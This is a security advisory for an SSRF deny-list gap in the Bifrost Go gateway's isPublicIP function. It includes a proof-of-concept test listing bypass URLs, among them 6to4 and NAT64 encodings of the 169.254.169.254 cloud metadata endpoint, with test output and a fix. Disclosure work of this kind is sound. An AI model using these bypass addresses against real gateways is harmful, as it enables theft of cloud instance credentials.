# [H] Bifrost's SSRF deny-list is incomplete: isPublicIP permits CGNAT, IPv6 6to4/NAT64, and site-local in FetchAndEncodeURL

## Summary
Severity: High
Advisory: GHSA-w98g-5w9p-p3rc
CVE: CVE-2026-55245
CWE: CWE-918
Ecosystem: Go
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2026-08-28
Source: https://github.com/advisories/GHSA-w98g-5w9p-p3rc
Type: github-advisory

## Affected
- Go: `github.com/maximhq/bifrost/core` — affected >=0 <1.5.17

## Details
## Summary

`isPublicIP` in `core/providers/utils/fetch.go` — the SSRF deny-list that gates `FetchAndEncodeURL` — does not reject several routable address ranges that map onto internal infrastructure. Carrier-Grade NAT (`100.64.0.0/10`, RFC 6598), IPv6 6to4 (`2002::/16`), NAT64 (`64:ff9b::/96` and `64:ff9b:1::/48`), and deprecated IPv6 site-local (`fec0::/10`) are all classified as public and permitted. An attacker who controls a multimodal image/document URL in a Bedrock or Vertex request body can drive the gateway to fetch internal services it should not reach — including the cloud instance-metadata endpoint via the 6to4 / NAT64 embeddings of `169.254.169.254`.

The rest of the fetch hardening is correct and is **not** part of this report: the dial-time `LookupIP` + pin to `ips[0]` closes the DNS-rebinding TOCTOU, `CheckRedirect` re-validates redirect targets, the scheme gate, the 25 MiB cap, and the 20 s timeout all work. This is purely a residual IP-classification gap in `isPublicIP`.

## Affected component

- File: `core/providers/utils/fetch.go`, function `isPublicIP` (lines 107-118), reached only through `FetchAndEncodeURL` (line 28).
- Go module: `github.com/maximhq/bifrost/core`
- Version: confirmed on the current `dev` HEAD `f415c144678bd4b411d74a1c1f85f18652833224` (`core/version` = `1.5.15`).

## Vulnerable code

```go
func isPublicIP(ip net.IP) bool {
	addr, ok := netip.AddrFromSlice(ip)
	if !ok {
		return false
	}
	addr = addr.Unmap()
	if addr.IsLoopback() || addr.IsPrivate() || addr.IsLinkLocalUnicast() || addr.IsLinkLocalMulticast() ||
		addr.IsMulticast() || addr.IsUnspecified() || addr.IsInterfaceLocalMulticast() {
		return false
	}
	return true
}
```

`addr.IsPrivate()` covers only RFC 1918 + RFC 4193 (`fc00::/7`); it does **not** cover CGNAT `100.64.0.0/10`. `addr.Unmap()` only collapses the `::ffff:0:0/96` IPv4-mapped form, so 6to4 (`2002::/16`) and NAT64 (`64:ff9b::/96`, `64:ff9b:1::/48`) IPv6 representations of internal/link-local IPv4 are never reduced to their embedded address and slip past every check. `fec0::/10` (deprecated IPv6 site-local) is likewise not matched by any of the helpers used.

## Attack surface / who can trigger it

`FetchAndEncodeURL` is invoked from the multimodal request-handling path of two providers:

- `core/providers/bedrock/utils.go:1073` (document `block.File.FileURL`), `:1187` (image URL via `convertImageToBedrockSource`)
- `core/providers/vertex/vertex.go:402` (document `block.File.FileURL`)

These URLs come straight from the client's chat-completion request body (a remote image/document URL in a multimodal content block). `SanitizeImageURL` (`core/schemas/utils.go:180`) only checks the scheme and a non-empty host — it performs no address filtering — so `isPublicIP` is the sole network guard, and it is always on (no opt-out flag). On a multi-tenant or shared gateway deployment, any client able to send a request can choose the fetch target.

## Impact

Server-side request forgery from the gateway into internal address space that the deny-list intends to block:

- **CGNAT `100.64.0.0/10`** — reachable anywhere the internal fabric uses RFC 6598 space (common in Kubernetes overlay networks and cloud NAT fabrics). Live on any such host with no extra preconditions.
- **6to4 `2002:a9fe:a9fe::` and NAT64 `64:ff9b::a9fe:a9fe`** — both embed `169.254.169.254`, the cloud instance-metadata endpoint. On a dual-stack or NAT64-enabled host (the default on AWS/GCP IPv6-only subnets) these reach IMDS even though the direct `169.254.169.254` and `::ffff:169.254.169.254` forms are correctly blocked.
- **`fec0::/10`** — deprecated site-local, still routed on some networks.

CWE-918 (Server-Side Request Forgery). Self-discovered while reviewing IP-classification deny-lists; the missing dimensions match the classes accepted as HIGH in the canonical references below.

## Proof of concept

A test placed in-package (`core/providers/utils/`) drives the **real** `FetchAndEncodeURL` — real `http.Client`, real `Transport.DialContext`, real `isPublicIP` — and classifies each target by whether `isPublicIP` let it past the gate. A `blocked fetch to non-public address` error means the gate rejected it before any dial (safe); any other outcome means the gate permitted the dial to a forbidden range (SSRF reachable).

```go
package utils

import (
	"context"
	"fmt"
	"strings"
	"testing"
	"time"
)

func TestSSRFGateDecision(t *testing.T) {
	cases := []struct{ name, url string }{
		{"CGNAT-100.64", "http://100.64.1.1:9/"},
		{"CGNAT-100.127", "http://100.127.255.254:9/"},
		{"6to4-IMDS", "http://[2002:a9fe:a9fe::]:9/"},
		{"NAT64-IMDS", "http://[64:ff9b::a9fe:a9fe]:9/"},
		{"NAT64-local-IMDS", "http://[64:ff9b:1::a9fe:a9fe]:9/"},
		{"sitelocal-fec0", "http://[fec0::1]:9/"},
		// controls (must be rejected at the gate):
		{"CONTROL-direct-IMDS", "http://169.254.169.254:9/"},
		{"CONTROL-RFC1918", "http://10.0.0.1:9/"},
		{"CONTROL-loopback", "http://127.0.0.1:9/"},
		{"CONTROL-mapped-IMDS", "http://[::ffff:169.254.169.254]:9/"},
	}
	for _, c := range cases {
		ctx, cancel := context.WithTimeout(context.Background(), 4*time.Second)
		_, _, err := FetchAndEncodeURL(ctx, c.url)
		cancel()
		gateBlocked := err != nil && strings.Contains(err.Error(), "blocked fetch to non-public address")
		fmt.Printf("%-22s gateBlock=%-6v %v\n", c.name, gateBlocked, err)
	}
}
```

Verbatim output (`go test ./providers/utils/ -run TestSSRFGateDecision -v` against HEAD `f415c14`, Go 1.26.1):

```
=== bifrost FetchAndEncodeURL SSRF gate decision (REAL code path) ===
target                 gateBlock  verbatim error / outcome
----------------------------------------------------------------------------------------------------
CGNAT-100.64           false      failed to fetch from "http://100.64.1.1:9/": Get "http://100.64.1.1:9/": context deadline exceeded
CGNAT-100.127          false      failed to fetch from "http://100.127.255.254:9/": Get "http://100.127.255.254:9/": context deadline exceeded
6to4-IMDS              false      failed to fetch from "http://[2002:a9fe:a9fe::]:9/": Get "http://[2002:a9fe:a9fe::]:9/": EOF
NAT64-IMDS             false      failed to fetch from "http://[64:ff9b::a9fe:a9fe]:9/": Get "http://[64:ff9b::a9fe:a9fe]:9/": context deadline exceeded
NAT64-local-IMDS       false      failed to fetch from "http://[64:ff9b:1::a9fe:a9fe]:9/": Get "http://[64:ff9b:1::a9fe:a9fe]:9/": context deadline exceeded
sitelocal-fec0         false      failed to fetch from "http://[fec0::1]:9/": Get "http://[fec0::1]:9/": EOF
CONTROL-direct-IMDS    true       failed to fetch from "http://169.254.169.254:9/": Get "http://169.254.169.254:9/": blocked fetch to non-public address 169.254.169.254
CONTROL-RFC1918        true       failed to fetch from "http://10.0.0.1:9/": Get "http://10.0.0.1:9/": blocked fetch to non-public address 10.0.0.1
CONTROL-loopback       true       failed to fetch from "http://127.0.0.1:9/": Get "http://127.0.0.1:9/": blocked fetch to non-public address 127.0.0.1
CONTROL-mapped-IMDS    true       failed to fetch from "http://[::ffff:169.254.169.254]:9/": Get "http://[::ffff:169.254.169.254]:9/": blocked fetch to non-public address 169.254.169.254
```

Reading the result: every control (direct IMDS, RFC 1918, loopback, IPv4-mapped IMDS) is rejected **at the gate** with `blocked fetch to non-public address` and no socket is ever opened. Every CGNAT / 6to4 / NAT64 / site-local target instead passes `isPublicIP` and proceeds to the network dial — observed as `context deadline exceeded` or `EOF` (a real connection attempt), never `blocked fetch to non-public address`. The `blocked` vs `dial-attempted` split isolates the `isPublicIP` classification defect precisely.

A standalone re-check of the verbatim `isPublicIP` body confirms the classification directly (Go 1.26.1):

```
100.64.0.1             isPublicIP=true   (CGNAT — should be blocked)
100.127.255.254        isPublicIP=true   (CGNAT)
2002:a9fe:a9fe::       isPublicIP=true   (6to4 -> 169.254.169.254)
64:ff9b::a9fe:a9fe     isPublicIP=true   (NAT64 -> 169.254.169.254)
64:ff9b:1::a9fe:a9fe   isPublicIP=true   (NAT64 local-use -> 169.254.169.254)
fec0::1                isPublicIP=true   (deprecated site-local)
169.254.169.254        isPublicIP=false  (direct IMDS — correctly blocked, control)
::ffff:169.254.169.254 isPublicIP=false  (IPv4-mapped — correctly blocked, control)
8.8.8.8                isPublicIP=true   (public — correctly allowed, control)
```

### Honest scope note

The test host used for verification has no CGNAT/NAT64 routing that returns to a local recorder, so I did not capture live instance-metadata bytes here — the connection lands on the upstream NAT or times out. The 6to4/NAT64 vectors require a dual-stack or NAT64-enabled host to reach IMDS, and the CGNAT vector requires the deployment's internal network to use `100.64.0.0/10`. These are the same routing preconditions the references below were accepted under. The defect demonstrated above is unconditional: `isPublicIP` permits the forbidden ranges on every host.

## References (canonical dimension precedents)

- CVE-2026-45741 / GHSA-86m8-88fq-xfxp — Gotenberg `IsPublicIP` IPv6 6to4 / NAT64 / site-local bypass; same Go `netip` + `Unmap` gap.
- GHSA-5jh9-2h63-pw4q — CC-Tweaked NAT64 (`64:ff9b::/96`) bypass; their fix adds `isCarrierGradeNatAddress` (CGNAT) + NAT64 handling.

## Suggested fix

In `isPublicIP`, after `Unmap()`:

1. Reject CGNAT: `100.64.0.0/10` for IPv4 (and the `::ffff:100.64.0.0/106` mapped form is already handled by `Unmap`).
2. For IPv6, extract any embedded IPv4 and re-run the classification on it: 6to4 (`2002::/16` -> bytes 2-5), NAT64 well-known (`64:ff9b::/96`) and local-use (`64:ff9b:1::/48`) -> low 32 bits. Then apply the same loopback/private/link-local/CGNAT checks to the extracted IPv4.
3. Reject deprecated site-local `fec0::/10`.

## References
- https://github.com/maximhq/bifrost/security/advisories/GHSA-w98g-5w9p-p3rc
- https://github.com/maximhq/bifrost/pull/4092
- https://github.com/maximhq/bifrost/commit/54ec431fc5255ff42c36420d88549477e0b33d89
- https://github.com/maximhq/bifrost
- https://github.com/maximhq/bifrost/releases/tag/core/v1.5.17
